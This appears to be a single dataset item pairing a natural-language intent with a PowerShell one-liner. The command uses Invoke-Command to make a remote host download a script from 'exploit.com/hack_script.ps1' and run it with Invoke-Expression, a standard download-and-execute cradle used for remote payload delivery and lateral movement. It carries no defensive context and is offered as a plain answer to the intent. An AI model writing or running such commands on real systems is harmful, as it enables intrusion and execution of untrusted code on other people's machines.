# Natural language intent:
# Download and execute a PowerShell script on a remote host.

Invoke-Command -ComputerName <remote_host> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://exploit.com/hack_script.ps1')}
